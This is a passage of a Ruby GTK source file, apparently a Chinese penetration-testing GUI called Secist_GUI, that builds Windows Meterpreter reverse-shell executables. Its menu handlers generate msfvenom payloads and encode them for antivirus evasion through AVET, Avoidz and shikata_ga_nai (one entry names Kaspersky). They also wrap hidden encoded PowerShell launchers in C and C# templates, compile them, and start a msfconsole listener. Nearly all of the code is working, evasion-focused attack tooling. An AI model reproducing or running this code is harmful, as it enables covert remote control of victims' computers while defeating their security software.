    #include <string.h>
    #include <stdlib.h>
    #include <ctype.h>
    #include <aclapi.h>
    #include <shlobj.h>
    #include <windows.h>
    #pragma comment(lib, "advapi32.lib")
    #pragma comment(lib, "shell32.lib")
    int main(int argc, char *argv[])
    {
    FreeConsole();
     ShellExecute( NULL,NULL, "powershell.exe", "powershell -nop -win Hidden -noni -enc #{powershell_encoded}",NULL,NULL);
    exit(0);
    }
    }


    #write out to a new file
    c_file_temp = File.new("c_file_temp.c", "w")
    c_file_temp.write(apacheTEMPLATE)
    c_file_temp.close



    system("i586-mingw32msvc-gcc c_file_temp.c -o output/temp2.exe -lws2_32 -mwindows > /dev/null 2>&1")
    system("rm c_file_temp.c")

    Zerenity::Info(:text=>" ☠ payload exec generated in => {☠ output/temp2.exe} ☠  " ,:title=>"☠output☠")
            system("service postgresql start")
            system("xterm  -geometry 124x26 -e msfconsole -x 'use multi/handler;\n set lhost #{ip};\n set lport #{port};\n set payload #{payload};\n exploit -j -z'")




    Gtk.main_quit
    end
 # 定义了菜单6按钮 => Avoidz{=> temp2}
###############################################################################################################################################################
    temp3 = Gtk::MenuItem.new "☠ Temp3"
    temp3.signal_connect "activate"do
    system ("clear")
    Avoidz.msf
   Dir.mkdir("output",755)
   ip = Zerenity::Entry(:title=>"☠LHOST☠",:text =>"☠Example : #{$ip1}☠", :ip => true)
   ip ? ip : puts("你没有输入ip","\n\n")
   port = Zerenity::Entry(:title=>"☠LPORT☠",:text=>"☠Example  LPORT  :4444☠",:port=>true)
   port ? port :  puts("你没有输入lport","\n\n")
   payload = Zerenity::List(:title=>"Web_delivery & PAYLOAD",
   :columns=>["单选","Target","METASPLOIT & PAYLOAD"],
   :data=>[[true,"https","windows/meterpreter/reverse_https"],
   [false,"tcp","windows/meterpreter/reverse_tcp"],
   [false,"http","windows/meterpreter/reverse_http"]],:radiolist=>true)
   payload ? payload :  puts("你没有输入payload","\n\n")
   payload = payload [1]
   #设置 ip /port
   mingw = true if File::exists?('/usr/lib/monodevelop') || File::exists?('/usr/bin/monodevelop')
   if mingw == false
       puts "[*] You must have Monodevelop installed in order to compile EXEs!!".red
       puts "\n\t[*] Run script setup.sh : ./setup.sh \n".red
       exit 1
   end
   Zerenity::Info(:text=>" ☠ payload 生成中 =>exe ☠ 请耐心等待几分钟 ☠  " ,:title=>"☠output☠")
    system("msfvenom -p #{payload} lhost=#{ip} lport=#{port} --platform windows -a x86 -e cmd/powershell_base64 -i 3 --smallest -s 341 -f raw -o raw_shellcode_temp > /dev/null 2>&1")
       powershell_encoded = gen_PS_shellcode()

   apacheTEMPLATE = %{// C#
   using System.Runtime.InteropServices;
   namespace pshcmd
   {
   	public class CMD
   	{
   		[DllImport("msvcrt.dll")]
   		public static extern int system(string cmd);
   		public static void Main()
   		{
   			system("powershell -nop -win Hidden -noni -enc #{powershell_encoded}");
   		}
   	}
   }
   }


   #write out to a new file
   c_file_temp = File.new("c_file_temp.c", "w")
   c_file_temp.write(apacheTEMPLATE)
   c_file_temp.close

   #compiling will require Monodevelop installed - "apt-get install monodevelop"
  #  puts "\n[*] compiling to exe......".yellow

   system("mcs c_file_temp.c -out:output/temp3.exe")
   system("rm c_file_temp.c")

  #  puts "-------------------------------------------------".light_blue
  #  puts "[*] payload exec generated in output/temp3.exe [*]".light_blue
  #  puts "-------------------------------------------------".light_blue
   Zerenity::Info(:text=>" ☠ payload exec generated in => {☠ output/temp3.exe} ☠  " ,:title=>"☠output☠")
           system("service postgresql start")
           system("xterm  -geometry 124x26 -e msfconsole -x 'use multi/handler;\n set lhost #{ip};\n set lport #{port};\n set payload #{payload};\n exploit -j -z'")




   Gtk.main_quit
   end
    # 定义了菜单6按钮 => Avoidz{=> temp3}
################################################################################################################################################################################################################
        about = Gtk::MenuItem.new "☠ About Me"
        about.signal_connect "activate" do
        Zerenity::Info(:text=>"   我是即刻安全团队的 Demon，平时较活跃于漏洞银行、ichunqiu、等平台。主要擅长msf、黑苹果及Kali的渗透测试等。目前专注于metaspolit的研究学习，希望借助本套教程分享一些我的学习思路和经验。对课程内容有任何疑问，都可通过以下渠道与我们取得联系:

                        Secist_GUI v1.0 (secist----2017.7.14)
                                < My Blog: www.ggsec.cn >
                              < My Team Blog: www.secist.com>
                                    即刻官方QQ 群：532925486
                                      欢迎使用我的GUI v1.0
                                 Ps:更改代码请注明原作者
                 -----------------------------------------------------
                                   " ,:title=>"☠About Me☠")
    Gtk.main_quit
end
    # 定义了菜单6按钮 => Avoidz
################################################################################################################################################################################################################
            menu7 = Gtk::Menu.new
            avet = Gtk::MenuItem.new "☠ Avet"
            avet.set_submenu menu7
      # 定义了菜单7按钮 =>Avet
################################################################################################################################################################################################################

            avet1 = Gtk::MenuItem.new "☠ Build win32 meterpreter rev https 20xshikata"
            avet1.signal_connect "activate" do
            Dir.mkdir("output",755)
            ip = Zerenity::Entry(:title=>"☠LHOST☠",:text =>"☠Example : #{$ip1}☠", :ip => true)
            ip ? ip : puts("你没有输入ip","\n\n")
            port = Zerenity::Entry(:title=>"☠LPORT☠",:text=>"☠Example  LPORT :4444☠",:port=>true)
            port ? port :  puts("你没有输入lport","\n\n")

          system  (". avet/build/global_win32.sh")
          system  ("  msfvenom -p windows/meterpreter/reverse_https lhost=#{ip } lport=#{port} -e x86/shikata_ga_nai -i 20 -f c -a x86 --platform Windows > avet/sc.txt")
          system  ("  ./avet/make_avet -f avet/sc.txt")
          system  ("  wine gcc -m32 -o output/pwn.exe avet.c")
          system  ("  echo "" > avet/defs.h")

          # puts "  +------------++-------------------------++-----------------------+".light_blue
          # puts "  | Name       ||  Descript   	          || Your Input              ".light_blue
          # puts "  +------------++-------------------------++-----------------------+".light_blue
          # puts "  | LHOST      ||  The Listen Addres      || #{ip}                    ".light_blue
          # puts "  | LPORT      ||  The Listen Ports       || #{port}                  ".light_blue
          # puts "  | OUTPUTNAME ||  The Filename output    || output/pwn.exe          ".light_blue
          # puts "  +------------++-------------------------++-----------------------+".light_blue
          Zerenity::Info(:text=>" ☠ payload exec generated in => {☠ output/pwn.exe} ☠  " ,:title=>"☠output☠")
          system("service postgresql start")
          system("xterm  -geometry 124x26 -e msfconsole -x 'use multi/handler;\n set lhost #{ip};\n set lport #{port};\n set payload windows/meterpreter/reverse_https;\n exploit -j -z'")


              Gtk.main_quit
          end
        # 定义了菜单7按钮 => avet => {Build win32 meterpreter rev https 20xshikata}
################################################################################################################################################################################################################

          avet2 = Gtk::MenuItem.new "☠ Build win32 meterpreter rev https shikata fopen"
          avet2.signal_connect "activate" do
          Dir.mkdir("output",755)
          ip = Zerenity::Entry(:title=>"☠LHOST☠",:text =>"☠Example : #{$ip1}☠", :ip => true)
          ip ? ip : puts("你没有输入ip","\n\n")
          port = Zerenity::Entry(:title=>"☠LPORT☠",:text=>"☠Example  LPORT :4444☠",:port=>true)
          port ? port :  puts("你没有输入lport","\n\n")

          system  (". avet/build/global_win32.sh")
          system  ("msfvenom -p windows/meterpreter/reverse_https lhost=#{ip} lport=#{port} -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > avet/sc.txt")
          system  ("./avet/format.sh avet/sc.txt > avet/scclean.txt && rm avet/sc.txt")
          system  ("./avet/make_avet -f avet/scclean.txt -F -E")
          system  ("  wine gcc -m32 -o output/pwn.exe avet.c")
          system  ("rm avet/scclean.txt && echo "" > avet/defs.h")


          Zerenity::Info(:text=>" ☠ payload exec generated in => {☠ output/pwn.exe} ☠  " ,:title=>"☠output☠")
          system("service postgresql start")
          system("xterm  -geometry 124x26 -e msfconsole -x 'use multi/handler;\n set lhost #{ip};\n set lport #{port};\n set payload windows/meterpreter/reverse_https;\n exploit -j -z'")



      Gtk.main_quit
end
# 定义了菜单7按钮 => avet => {☠ Build win32 meterpreter rev https shikata fopen}
################################################################################################################################################################################################################

          avet3 = Gtk::MenuItem.new "☠ Build win32 meterpreter unstaged rev https 20xshikata"
          avet3.signal_connect "activate" do
          Dir.mkdir("output",755)
          ip = Zerenity::Entry(:title=>"☠LHOST☠",:text =>"☠Example : #{$ip1}☠", :ip => true)
          ip ? ip : puts("你没有输入ip","\n\n")
          port = Zerenity::Entry(:title=>"☠LPORT☠",:text=>"☠Example  LPORT :4444☠",:port=>true)
          port ? port :  puts("你没有输入lport","\n\n")

          system  (". avet/build/global_win32.sh")
          system  ("msfvenom -p windows/meterpreter_reverse_https lhost=#{ip} lport=#{port} extensions=stdapi,priv -e x86/shikata_ga_nai -i 20 -f c -a x86 --platform Windows > avet/sc.txt")
          system  ("./avet/make_avet -f avet/sc.txt")
          system  ("wine gcc -m32 -o output/pwn.exe avet.c")
          system  ("echo "" > defs.h")


          Zerenity::Info(:text=>" ☠ payload exec generated in => {☠ output/pwn.exe} ☠  " ,:title=>"☠output☠")
          system("service postgresql start")
          system("xterm  -geometry 124x26 -e msfconsole -x 'use multi/handler;\n set lhost #{ip};\n set lport #{port};\n set payload windows/meterpreter/reverse_https;\n exploit -j -z'")



      Gtk.main_quit
end
# 定义了菜单7按钮 => avet => {☠ Build win32 meterpreter rev https shikata fopen}
################################################################################################################################################################################################################

          avet4 = Gtk::MenuItem.new "☠ Build win32 shell rev tcp shikata fopen kaspersky"
          avet4.signal_connect "activate" do
          Dir.mkdir("output",755)
          ip = Zerenity::Entry(:title=>"☠LHOST☠",:text =>"☠Example : #{$ip1}☠", :ip => true)
          ip ? ip : puts("你没有输入ip","\n\n")
          port = Zerenity::Entry(:title=>"☠LPORT☠",:text=>"☠Example  LPORT :4444☠",:port=>true)
          port ? port :  puts("你没有输入lport","\n\n")

          system  (". avet/build/global_win32.sh")
          system  ("msfvenom -p windows/meterpreter_reverse_https lhost=#{ip} lport=#{port} extensions=stdapi,priv -e x86/shikata_ga_nai -i 20 -f c -a x86 --platform Windows > avet/sc.txt")
          system  ("./avet/make_avet -f avet/sc.txt")
          system  ("wine gcc -m32 -o output/pwn.exe avet.c")
          system  ("echo "" > defs.h")


          Zerenity::Info(:text=>" ☠ payload exec generated in => {☠ output/pwn.exe} ☠  " ,:title=>"☠output☠")
          system("service postgresql start")
          system("xterm  -geometry 124x26 -e msfconsole -x 'use multi/handler;\n set lhost #{ip};\n set lport #{port};\n set payload windows/meterpreter/reverse_https;\n exploit -j -z'")



      Gtk.main_quit
end
# 定义了菜单7按钮 => avet => {☠ Build win32 shell rev tcp shikata fopen kaspersky}
################################################################################################################################################################################################################

          avet5 = Gtk::MenuItem.new "☠ Build win32 meterpreter rev https fopen shikata"
          avet5.signal_connect "activate" do
          Dir.mkdir("output",755)
          ip = Zerenity::Entry(:title=>"☠LHOST☠",:text =>"☠Example : #{$ip1}☠", :ip => true)
          ip ? ip : puts("你没有输入ip","\n\n")
          port = Zerenity::Entry(:title=>"☠LPORT☠",:text=>"☠Example  LPORT :4444☠",:port=>true)
          port ? port :  puts("你没有输入lport","\n\n")

          system  (". avet/build/global_win32.sh")
          system  ("msfvenom -p windows/meterpreter/reverse_https lhost=#{ip} lport=#{port} -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > avet/sc.txt")
          system  ("./avet/make_avet -f avet/sc.txt -F -p")
          system  ("wine gcc -m32 -o output/pwn.exe avet.c")


          Zerenity::Info(:text=>" ☠ payload exec generated in => {☠ output/pwn.exe} ☠  " ,:title=>"☠output☠")
          system("service postgresql start")
          system("xterm  -geometry 124x26 -e msfconsole -x 'use multi/handler;\n set lhost #{ip};\n set lport #{port};\n set payload windows/meterpreter/reverse_https;\n exploit -j -z'")



      Gtk.main_quit
end
# 定义了菜单7按钮 => avet => {☠ Build win32 meterpreter rev https fopen shikata}
################################################################################################################################################################################################################

          avet6 = Gtk::MenuItem.new "☠ Build win64 meterpreter rev tcp xor"
          avet6.signal_connect "activate" do
          Dir.mkdir("output",755)
          ip = Zerenity::Entry(:title=>"☠LHOST☠",:text =>"☠Example : #{$ip1}☠", :ip => true)
          ip ? ip : puts("你没有输入ip","\n\n")
          port = Zerenity::Entry(:title=>"☠LPORT☠",:text=>"☠Example  LPORT :4444☠",:port=>true)
          port ? port :  puts("你没有输入lport","\n\n")

          system  (". avet/build/global_win64.sh")
          system  ("msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=#{ip} lport=#{port} -e x64/xor -f c --platform Windows > avet/sc.txt")
          system  ("./avet/format.sh avet/sc.txt > avet/scclean.txt && rm avet/sc.txt")
          system  ("./avet/make_avet -f avet/scclean.txt -X -E")
          system  ("wine gcc -m64 -o output/pwn.exe avet.c")
          system  ("rm avet/scclean.txt && echo "" > avet/defs.h")


          Zerenity::Info(:text=>" ☠ payload exec generated in => {☠ output/pwn.exe} ☠  " ,:title=>"☠output☠")
          system("service postgresql start")
          system("xterm  -geometry 124x26 -e msfconsole -x 'use multi/handler;\n set lhost #{ip};\n set lport #{port};\n set payload windows/x64/meterpreter/reverse_tcp;\n exploit -j -z'")



      Gtk.main_quit
end
# 定义了菜单7按钮 => avet => {☠ Build win64 meterpreter rev tcp xo}
################################################################################################################################################################################################################

          avet7 = Gtk::MenuItem.new "☠ Build win64 meterpreter rev tcp xor fopen"
          avet7.signal_connect "activate" do
          Dir.mkdir("output",755)
          ip = Zerenity::Entry(:title=>"☠LHOST☠",:text =>"☠Example : #{$ip1}☠", :ip => true)
          ip ? ip : puts("你没有输入ip","\n\n")
          port = Zerenity::Entry(:title=>"☠LPORT☠",:text=>"☠Example  LPORT :4444☠",:port=>true)
          port ? port :  puts("你没有输入lport","\n\n")

          system  (". avet/build/global_win64.sh")
          system  ("msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=#{ip} -e x64/xor lport=#{port} -f c --platform Windows > avet/sc.txt")
          system  ("./avet/make_avet -f avet/sc.txt -F -X")
          system  ("wine gcc -m64 -o output/pwn.exe avet.c")
          system  ("rm avet/sc.txt && echo "" > avet/defs.h")


          Zerenity::Info(:text=>" ☠ payload exec generated in => {☠ output/pwn.exe} ☠  " ,:title=>"☠output☠")
          system("service postgresql start")
          system("xterm  -geometry 124x26 -e msfconsole -x 'use multi/handler;\n set lhost #{ip};\n set lport #{port};\n set payload windows/x64/meterpreter/reverse_tcp;\n exploit -j -z'")



      Gtk.main_quit
end
# 定义了菜单7按钮 => avet => {☠ Build win64 meterpreter rev tcp xor fopen}
################################################################################################################################################################################################################

          filemenu.append msf_moudle
          menu1.append web_delivery
             menu2.append powershell
             menu2.append php
             menu2.append python
          menu1.append bypass_server
          menu1.append invoke_powerShellTcp
          filemenu.append ps1encode
             menu5.append cmd
             menu5.append bat
             menu5.append ps1
          filemenu.append  avoidz
             menu6.append  temp1
             menu6.append  temp2
             menu6.append  temp3
          filemenu.append avet
             menu7.append avet1  #{Build win32 meterpreter rev https 20xshikata}
             menu7.append avet2  #{☠ Build win32 meterpreter rev https shikata fopen}
             menu7.append avet3  #{☠ Build win32 meterpreter rev https shikata fopen}
             menu7.append avet4  #{☠ Build win32 shell rev tcp shikata fopen kaspersky}
             menu7.append avet5  #{☠ Build win32 meterpreter rev https fopen shikata}
             menu7.append avet6  #{☠ Build win64 meterpreter rev tcp xo}
             menu7.append avet7  #{☠ Build win64 meterpreter rev tcp xor fopen}
          filemenu.append about
#         布局设置 : msf_moudle => {web_delivery =>  powershell /php /python}
#                                 {bypass_server}
#                                 {ps1encode} => CDM /PS1 /Bat
#                                 {avoidz} =>temp1/temp2/temp3
#                                 {avet} =>avet1/avet2/avet3/avet4/avet5/avet6/avet7
#
################################################################################################################
          exit = Gtk::MenuItem.new "Exit"
          exit.signal_connect "activate" do
              Gtk.main_quit
          end
          # 设置退出按钮
################################################################################################################
          filemenu.append exit
          vbox = Gtk::VBox.new false, 4
          vbox.pack_start mb, false, false, 0
          add vbox
    end
  end

  Gtk.init
      window = RubyApp.new
  Gtk.main
